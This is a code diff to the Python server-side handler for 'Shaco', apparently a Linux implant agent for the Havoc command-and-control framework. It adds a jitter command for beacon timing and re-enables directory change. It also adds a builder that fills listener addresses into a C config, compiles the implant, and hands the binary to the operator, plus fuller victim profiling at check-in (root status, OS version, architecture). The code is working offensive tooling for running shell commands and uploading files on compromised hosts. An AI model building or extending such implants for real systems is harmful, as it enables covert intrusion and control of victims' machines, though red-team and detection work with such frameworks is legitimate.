@@ -4,6 +4,11 @@ from havoc.agent import AgentType, Command, CommandParam, MessageType
 from havoc.service import HavocService
 from Protocol.python.Packer import Packer, Parser
 from base64 import b64decode
+from shutil import which, rmtree
+from os import makedirs, path
+from traceback import print_exc
+
+import subprocess
 
 COMMAND_OK = 13
 COMMAND_GET = 14
@@ -18,6 +23,7 @@ COMMAND_CD = 91
 COMMAND_PWD = 92
 COMMAND_EXIT = 94
 COMMAND_SLEEP = 95
+COMMAND_JITTER = 96
 
 class CommandExit(Command):
     CommandId = COMMAND_EXIT
@@ -31,7 +37,6 @@ class CommandExit(Command):
     def job_generate( self, arguments: dict ) -> bytes:        
         Task = Packer()
         Task.add_int32( self.CommandId )
-        Task.add_str( arguments['command'] )
         return Task.get_buffer()
 
 class CommandSleep(Command):
@@ -39,6 +44,27 @@ class CommandSleep(Command):
     Name = "sleep"
     Description = "change sleep duration"
     Help = ""
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name = 'time',
+            is_file_path = False,
+            is_optional = False
+        )
+    ]
+    Mitr = []
+
+    def job_generate( self, arguments: dict ) -> bytes:        
+        Task = Packer()
+        Task.add_int32( self.CommandId )
+        Task.add_int32( int(arguments['time']) )
+        return Task.get_buffer()
+
+class CommandJitter(Command):
+    CommandId = COMMAND_JITTER
+    Name = "jitter"
+    Description = "change max timeout duration: jitter = random_int(sleep, sleep+maxtimeout)"
+    Help = "jitter <time>"
     NeedAdmin = False
     Params = [
         CommandParam(
@@ -79,7 +105,7 @@ class CommandShell(Command):
 class CommandUpload(Command):
     CommandId = COMMAND_UPLOAD
     Name = "upload"
-    Description = "upload file to agent"
+    Description = "upload file to agent. Don't try upload > 7000k"
     Help = "upload <localfile> <remote put file>"
     NeedAdmin = False
     Params = [
@@ -97,10 +123,14 @@ class CommandUpload(Command):
     Mitr = ['']
 
     def job_generate( self, arguments: dict ) -> bytes:        
+
+        file = arguments['localfile'].encode()
+
         Task = Packer()
         Task.add_int32( self.CommandId )
+        Task.add_uint64( len(file))
         Task.add_str( arguments['remotefile'] )
-        Task.add_data64( b64decode(arguments['localfile']) )
+        Task.add_data64( file  )
         return Task.get_buffer()
 
 class CommandCheckin(Command):
@@ -163,44 +193,151 @@ class Shaco(AgentType):
     Arch = [
         "x64",
         "x86",
-        'ARM'
+        'arm'
     ]
     
     Formats = [
         {
             "Name": "Linux Executable",
             "Extension": "elf"
-        },
-        {
-            'Name': 'Linux Shared Library',
-            'Extension': 'so'
-        },
-        {
-            "Name": "MacOS",
-            "Extension": 'macho'
-        },
+        }
+        #        {
+        #    'Name': 'Linux Shared Library',
+        #    'Extension': 'so'
+        #},
+        #{
+        # "Name": "MacOS",
+            #    "Extension": 'macho'
+            #},
     ]
     
     BuildingConfig = {
         'Sleep': '5',
-        'Jitter': '0',
-        'RemoteConfig' : False
+        'MaxTimeout': '0'
     }
 
     Commands = [
         CommandShell(),
-        #        CommandCd(), #fix error in shaco to change directory
+        CommandCd(), 
         CommandPwd(),
         CommandUpload(),
         CommandCheckin(),
         CommandExit(),
-        CommandSleep()
+        CommandSleep(),
+        CommandJitter()
     ]
 
-#TODO: implement generator
+
     def generate(self, config:dict) -> None:
-        print(f"Config: {config}")
-        self.builder_send_message(config['ClientID'], MessageType.Good, "later")
+        tmppath = "/tmp/shaco_agent_generation"
+
+        cliid = config['ClientID']
+
+        try:
+            self.builder_send_message(cliid, MessageType.Info, "initializing")
+            if not which("cmake"):
+                self.builder_send_message(cliid, MessageType.Error, "cmake not found")
+                return
+            if not which("make"):
+                self.builder_send_message(cliid, MessageType.Error, "make not found")
+                return
+            if not which("clang"):
+                self.builder_send_message(cliid, MessageType.Error, "compiler not found")
+                return
+            if not path.exists('./CMakeLists.txt'):
+                self.builder_send_message(cliid, MessageType.Error, "CMakeLists not found")
+                return
+            if not path.exists('./Config/Settings.c'):
+                self.builder_send_message(cliid, MessageType.Error, "Config File not found")
+                return
+
+            original_cfg_data = ''
+            with open('./Config/Settings.c', 'r') as cfg:
+                original_cfg_data = cfg.read()
+
+            supported_arch = [ 'x86', 'x64', 'ARM' ]
+            config_vars = ['%IP%', '%ENDPOINT%', '%DOMAIN%', '%USERAGENT%', '%TIMEOUT%', '%PORT%', '%MAXTIMEOUT%']
+            cfg_data = ''
+
+            if not all(var in original_cfg_data for var in config_vars):
+                self.builder_send_message(cliid, MessageType.Error, "Config File error, parameters not found")
+                return
+            
+            if int(config['Config']['Sleep']) <= 0:
+                self.builder_send_message(cliid, MessageType.Error, "Sleep has to be greater than 0")
+                return
+
+            if int(config['Config']['MaxTimeout']) < 0:
+                self.builder_send_message(cliid, MessageType.Error, "MaxTimeout negative is not valid")
+                return
+
+            if not config['Options']['Arch'] in supported_arch:
+                self.builder_send_message(cliid, MessageType.Error, "Unsupported architecture")
+                return
+
+            uris = config['Options']['Listener']['Uris']
+            uri = '/' if uris is None else uris[0]
+            if uri == '':
+                uri = '/'
+
+            architecture = config['Options']['Arch']
+            port = config['Options']['Listener']['PortConn']
+            if port == '':
+                port = config['Options']['Listener']['PortBind']
+
+            ip =  config['Options']['Listener']['HostBind']
+            domain = config['Options']['Listener']['Hosts'][0]
+            useragent = config['Options']['Listener']['UserAgent']
+            sleep =  config['Config']['Sleep']
+            jitter = config['Config']['MaxTimeout']
+
+            cfg_data = original_cfg_data.replace('%IP%', ip)
+            cfg_data = cfg_data.replace('%ENDPOINT%', uri)
+            cfg_data = cfg_data.replace('%DOMAIN%', domain)
+            cfg_data = cfg_data.replace('%USERAGENT%', useragent)
+            cfg_data = cfg_data.replace('%TIMEOUT%', sleep)
+            cfg_data = cfg_data.replace('%MAXTIMEOUT%', jitter)
+            cfg_data = cfg_data.replace('%PORT%', port)
+
+            try:
+                with open('./Config/Settings.c' ,'w') as cfg:
+                    cfg.write(cfg_data)
+    
+                if path.exists(tmppath):
+                    print(f"Removing {tmppath}")
+                    rmtree(tmppath)
+
+                print(f"Creating path {tmppath}")
+                makedirs(tmppath, exist_ok=True)
+                
+                print("Executing cmake compile command")
+                out = subprocess.check_output(f'cmake -S . -B {tmppath} -DCMAKE_BUILD_TYPE=Release -DCOMPILE_ARCH={architecture}', shell=True, stderr=subprocess.STDOUT)
+
+                print("sending data to client")
+                self.builder_send_message(cliid, MessageType.Info, out.strip().decode())
+
+                out = subprocess.check_output(f'make -C {tmppath}', shell=True, stderr=subprocess.STDOUT)
+
+                self.builder_send_message(cliid, MessageType.Info, out.strip().decode())
+
+                with open(f'{tmppath}/shaco', 'rb') as f:
+                    self.builder_send_message(cliid, MessageType.Good, 'Sending compiled download!')
+                    self.builder_send_payload(cliid, f'shaco', f.read())
+
+            except Exception as ex:
+                self.builder_send_message(cliid, MessageType.Error, f'Error in compilation {str(ex)}')
+                print_exc()
+                return
+            finally:
+                with open('./Config/Settings.c' ,'w') as cfg:
+                    cfg.write(original_cfg_data)
+
+        except Exception as ex:
+            print(f"Error in generate: {str(ex)}")
+            self.builder_send_message(cliid, MessageType.Error, f"Error on generate: {str(ex)}")
+            print_exc()
+
+        print('Exiting generate')
 
     def response(self, havoc_response: dict):
         agent_response = b64decode(havoc_response['Response'])
@@ -220,18 +357,29 @@ class Shaco(AgentType):
                 "InternalIP"        : parser.get_str(),
                 "Process Path"      : "/",
                 "Process ID"        : str(parser.get_int32()),
-                "Process Parent ID" : "0",
-                "Process Arch"      : "x64",
+                "Process Parent ID" : str(parser.get_int32()),
+                "Process Arch"      : parser.get_str(),
                 "Process Name"      : "shaco",
                 "Process Elevated"  : parser.get_int32(),
-                "OS Version"        : "linux",
+                "OS Version"        : parser.get_str(),
                 "OS Build"          : "1.1.1",
                 "OS Arch"           : "1.1.1",
                 "Sleep"             : parser.get_int32(),
             }
 
             self.register(havoc_response['AgentHeader'], RegisterInfo)
-            self.console_message(agentid, MessageType.Good, 'New agent registered', '')
+            self.console_message(agentid, MessageType.Good, 'new checkin', 
+f"""
+AgentID:     \t{RegisterInfo['AgentID']}
+Username:    \t{RegisterInfo['Username']}
+Hostname:    \t{RegisterInfo['Hostname']}
+Domain:      \t{RegisterInfo['Domain']}
+Version:     \t{RegisterInfo['OS Version']}
+Internal IP: \t{RegisterInfo['InternalIP']}
+Is root:     \t{RegisterInfo['Process Elevated']}
+Sleep:       \t{RegisterInfo['Sleep']}
+Jitter:      \t{parser.get_int32()}
+""")
 
             pack = Packer()
             pack.add_int32(COMMAND_OK)
@@ -282,7 +430,7 @@ class Shaco(AgentType):
 def main():
     Havoc_Shaco = Shaco()
     Havoc_Service = HavocService(
-        endpoint="wss://127.0.0.1:40056/service-endpoint",
+        endpoint=f"wss://127.0.0.1:40056/service-endpoint",
         password="service-password"
     )
     Havoc_Service.register_agent(Havoc_Shaco)
